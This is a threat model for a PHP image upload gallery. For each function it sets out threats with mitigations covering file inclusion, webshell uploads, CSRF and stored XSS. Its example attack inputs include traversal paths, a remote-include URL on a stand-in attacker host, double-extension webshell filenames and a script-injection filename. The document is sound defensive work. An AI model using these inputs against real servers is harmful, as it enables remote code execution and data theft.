# Threat Model — Image Upload Gallery

## 1. Global Security Context

**Trust Boundaries**
- HTTP request body (`$_FILES`, `$_POST`) — fully untrusted
- `$_GET['page']` URL parameter — untrusted, drives `include()` routing
- File system (`uploads/`) — must be write-only from PHP perspective, never executable
- `$_FILES['type']` — browser-supplied, completely untrusted

**Key Assets**
- Server file system (arbitrary write → RCE risk)
- Other users' uploaded files (confidentiality)
- Server PHP execution context (code execution)
- Session store (CSRF token integrity)

**Auth Model**
- No authentication — anonymous public access to upload and gallery
- CSRF synchronizer token protects state-changing POST requests
- Stateless — no user roles or sessions beyond CSRF

---

## 2. Function-Level Threats

### Function: `index.php:routePage()`
*Role*: Maps `$_GET['page']` to an `include()` target  
*Untrusted inputs*: `$_GET['page']` (raw user string)  
*Security-relevant operations*: `include()` with user-derived path  
*Threats*:
- **T1: Local File Inclusion (CWE-22)** — If `$_GET['page']` is passed directly or partially to `include()`, an attacker can supply `../../etc/passwd` or `../../lib/security` to read or execute arbitrary files
- **T2: Remote File Inclusion** — With `allow_url_include=On` (non-default but possible), a URL like `http://attacker.com/shell` executes remote code

*Protections*:
- Use a strict allowlist array: `['upload'=>'pages/upload.php', 'gallery'=>'pages/gallery.php', 'about'=>'pages/about.php']`
- Never concatenate user input into the path — only use the allowlist value
- Assert `allow_url_include` is Off via `ini_get()` at startup

---

### Function: `pages/upload.php:handleUpload()`
*Role*: Receives `$_FILES['photo']`, validates, stores file  
*Untrusted inputs*: `$_FILES['photo']['tmp_name']`, `$_FILES['photo']['name']`, `$_FILES['photo']['type']`, `$_FILES['photo']['size']`  
*Security-relevant operations*: `move_uploaded_file()`, MIME inspection, filename construction  
*Threats*:
- **T3: Unrestricted File Upload — PHP webshell (CWE-434)** — Attacker uploads `shell.php` (or `shell.php.jpg`). If MIME validation relies only on `$_FILES['type']` (browser-controlled) or file extension, a `.php` file lands in `uploads/` and becomes directly executable
- **T4: Unrestricted File Upload — double extension bypass** — Filenames like `evil.php.jpg` or `evil.php%00.jpg` can fool naive extension checks while Apache/Nginx may still execute them as PHP
- **T5: Path Traversal via filename (CWE-22)** — `$_FILES['name']` containing `../../config.php` can overwrite files outside `uploads/` if the original name is used in `move_uploaded_file()`
- **T6: MIME confusion / polyglot files** — A file that is a valid JPEG and a valid PHP script simultaneously passes image checks but executes as PHP

*Protections*:
- Validate MIME type using `finfo_file($finfo, $tmpPath)` on the server-side tmp file — never trust `$_FILES['type']`
- Allowlist: only `image/jpeg`, `image/png`, `image/gif`, `image/webp`
- Rename every file to `hash(originalName + microtime()) . $safeExt` — discard original name entirely
- Hard limit file size to 5 MB (check both `$_FILES['size']` and `php.ini` `upload_max_filesize`)
- Enforce no-PHP execution in `uploads/` via `.htaccess`

---

### Function: `lib/security.php:validateMime()`
*Role*: Inspects tmp file with `finfo_file()` and returns allowed extension  
*Untrusted inputs*: `$tmpPath` (path to PHP-managed tmp file — safe), file bytes (untrusted content)  
*Security-relevant operations*: `finfo_open(FILEINFO_MIME_TYPE)`, MIME-to-extension mapping  
*Threats*:
- **T7: Polyglot bypass** — A file crafted to pass `finfo` MIME check (valid JPEG header) while containing PHP code later in the file body. `finfo` inspects magic bytes only — it does not scan the full payload
- **T8: SVG as image** — SVG is an XML format that can embed JavaScript. If `image/svg+xml` is accidentally allowed, stored SVGs execute scripts in browsers

*Protections*:
- Explicitly exclude `image/svg+xml` from the allowlist
- Consider stripping EXIF/metadata with `imagecreatefromjpeg()` + `imagejpeg()` re-encode to destroy embedded payloads
- Output images with `Content-Type: image/jpeg` (etc.) rather than inferring from extension

---

### Function: `lib/security.php:verifyCsrfToken()`
*Role*: Compares `$_POST['csrf_token']` to `$_SESSION['csrf_token']`  
*Untrusted inputs*: `$_POST['csrf_token']`  
*Security-relevant operations*: String comparison, session read/write  
*Threats*:
- **T9: CSRF — forged upload (CWE-352)** — Without token validation, an attacker can host a page that silently POSTs to the gallery, uploading a file as the victim
- **T10: Timing side-channel** — Using `==` instead of `hash_equals()` leaks token length and prefix via timing

*Protections*:
- Always use `hash_equals($stored, $submitted)` — constant-time comparison
- Regenerate token after each successful POST
- Tie token to session ID

---

### Function: `pages/gallery.php:listImages()`
*Role*: Scans `uploads/` with `glob()`, renders `<img src=...>` tags  
*Untrusted inputs*: Filenames from disk (could be attacker-controlled if rename is skipped)  
*Security-relevant operations*: `glob()`, HTML rendering of filenames  
*Threats*:
- **T11: Stored XSS via filename (CWE-79)** — If original filenames are preserved and rendered as `<img alt="$filename">` or `<p>$filename</p>` without escaping, a filename like `"><script>alert(1)</script>` executes in the browser
- **T12: Directory listing / path exposure** — Rendering full server paths rather than relative URLs leaks directory structure

*Protections*:
- Always `htmlspecialchars($filename, ENT_QUOTES, 'UTF-8')` before any HTML output
- Use only relative URLs (`uploads/abc123.jpg`), never absolute server paths
- Since filenames are hash-renamed, the original name never appears in the DOM

---

## 3. Project Integrity

**Critical Risks**

1. **`uploads/.htaccess` not deployed** — If this file is missing, PHP files in `uploads/` are executed by the web server directly. The PHP application code has no way to prevent this at runtime. Mitigation: assert its presence in a startup check; document it in README.
2. **`session_start()` missing** — CSRF tokens stored in `$_SESSION` are silently lost if `session_start()` is not called before any output. Mitigation: call in `index.php` before any include.
3. **`allow_url_fopen` + `allow_url_include`** — Non-default but common in shared hosting. Mitigation: document required `php.ini` settings in README; assert at boot.

**Top 3 Attack Vectors**
1. Upload a `.php` webshell disguised as a JPEG → direct code execution via `uploads/shell.php`
2. Supply `../../index` as `?page=` → LFI reading or double-including sensitive files
3. CSRF-triggered upload from a third-party page → unwanted content stored on server

**Recommended Additions**
- Rate-limit upload POST requests (e.g. max 10/min per IP) to prevent storage exhaustion
- Serve uploaded files through a PHP proxy (`serve.php?file=hash`) that sets correct `Content-Type` and `Content-Disposition`, rather than serving them as static files — eliminates direct-execute risk entirely
- Add `open_basedir` restriction in `php.ini` to contain any LFI to the project root
